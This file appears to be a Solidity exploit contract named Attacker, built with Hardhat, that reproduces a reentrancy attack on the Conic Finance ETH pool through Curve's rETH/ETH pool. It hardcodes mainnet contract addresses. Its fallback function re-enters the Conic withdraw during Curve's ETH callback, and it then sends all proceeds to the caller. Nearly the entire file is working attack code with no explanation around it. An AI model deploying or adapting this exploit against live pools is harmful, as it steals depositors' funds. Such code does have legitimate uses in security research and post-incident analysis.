// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "hardhat/console.sol";

interface ICurve {
    function add_liquidity(
        uint256[2] calldata amounts,
        uint256 min_mint_amount,
        bool use_eth
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256 _amount,
        uint256[2] calldata min_amounts,
        bool use_eth
    ) external;

    function remove_liquidity_one_coin(
        uint256 token_amount,
        uint256 i,
        uint256 min_amount,
        bool use_eth
    ) external returns (uint256);

    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth
    ) external payable returns (uint256);
}

interface IConicEthPool {
    function deposit(uint256 underlyingAmount,uint256 minLpReceived) external returns (uint256);
    function deposit(uint256 underlyingAmount,uint256 minLpReceived,bool stake) external returns (uint256);
    function withdraw(uint256 conicLpAmount,uint256 minUnderlyingReceived) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address owner)external view returns(uint256);
    function approve(address spender, uint256 amount)external;
}

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external; 
    function approve(address guy, uint wad) external returns (bool);
}

interface IRETH {
    function burn(uint256 _rethAmount) external;
}

contract Attacker {
    event LogError1(string message);
    event LogError2(bytes data);

    address public conicEthPool = address(0xBb787d6243a8D450659E09ea6fD82F1C859691e9);
    address public conicEthPoolLp = address(0x3565A68666FD3A6361F06f84637E805b727b4A47);
    address public weth = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address public curve_RETH_ETH = address(0x0f3159811670c117c372428D4E69AC32325e4D0F);
    address public reth = address(0xae78736Cd615f374D3085123A210448E74Fc6393);

    constructor() {
        IWETH(weth).approve(conicEthPool, type(uint256).max);
        IWETH(weth).approve(curve_RETH_ETH, type(uint256).max);
    }

    function execution() public payable {
        uint256 ethBalance = address(this).balance;
        console.log("eth balance: %s", ethBalance);

        try IWETH(weth).deposit{value: 400 ether}() {
            console.log("weth deposit successful");
        } catch Error(string memory reason) {
            console.log("weth deposit error: %s", reason);
        } catch (bytes memory reason) {
            console.log("weth deposit error: %s", string(reason));
        }

        try IConicEthPool(conicEthPool).deposit(200 ether, 0, false) returns (uint256 amount) {
            console.log("conic eth pool deposit successful, amount: %s", amount);
        } catch Error(string memory reason) {
            console.log("conic eth pool deposit error: %s", reason);
        } catch (bytes memory reason) {
            console.log("conic eth pool deposit error: %s", string(reason));
        }

        //
        uint256[2] memory curve_add = [200 ether, uint256(0)];
        uint256 curveLpAmount = ICurve(curve_RETH_ETH).add_liquidity(curve_add, 0, false);
        uint256[2] memory curve_mini =[uint256(0), uint256(0)];
        ICurve(curve_RETH_ETH).remove_liquidity(curveLpAmount, curve_mini, true);

        //
        uint256 lpAmount = IERC20(conicEthPoolLp).balanceOf(address(this));
        console.log("lp amount: %s", lpAmount);

        //
        try IConicEthPool(conicEthPool).withdraw(lpAmount, 0) returns (uint256 amount) {
            console.log("conic eth pool withdraw successful, amount: %s", amount);
        } catch Error(string memory reason) {
            console.log("conic eth pool withdraw error: %s", reason);
        } catch (bytes memory reason) {
            console.log("conic eth pool withdraw error: %s", string(reason));
        }

        //
        try IWETH(weth).withdraw(IERC20(weth).balanceOf(address(this))) {
            console.log("weth withdraw successful");
        } catch Error(string memory reason) {
            console.log("weth withdraw error: %s", reason);
        } catch (bytes memory reason) {
            console.log("weth withdraw error: %s", string(reason));
        }

        try IRETH(reth).burn(IERC20(reth).balanceOf(address(this))) {
            console.log("reth burn successful");
        } catch Error(string memory reason) {
            console.log("reth burn error: %s", reason);
        } catch (bytes memory reason) {
            console.log("reth burn error: %s", string(reason));
        }      
        //
        (bool success, ) = payable(msg.sender).call{value: address(this).balance}("");
    }

    //receive() external payable {}

    fallback(bytes calldata data) external payable returns (bytes memory) {
        console.log("msg sender: ", msg.sender);
        if (msg.sender == curve_RETH_ETH) {
            //
            uint256 lpAmount = IERC20(conicEthPoolLp).balanceOf(address(this));
            console.log("lp amount: %s", lpAmount);
            //
            try IConicEthPool(conicEthPool).withdraw(lpAmount, 0) returns (uint256 amount) {
                console.log("conic eth pool withdraw successful, amount: %s", amount);
            } catch Error(string memory reason) {
                console.log("conic eth pool withdraw error: %s", reason);
                emit LogError1(reason);
            } catch (bytes memory reason) {
                console.log("conic eth pool withdraw error: %s", string(reason));
                emit LogError2(reason);
            }           
        }
    }
}
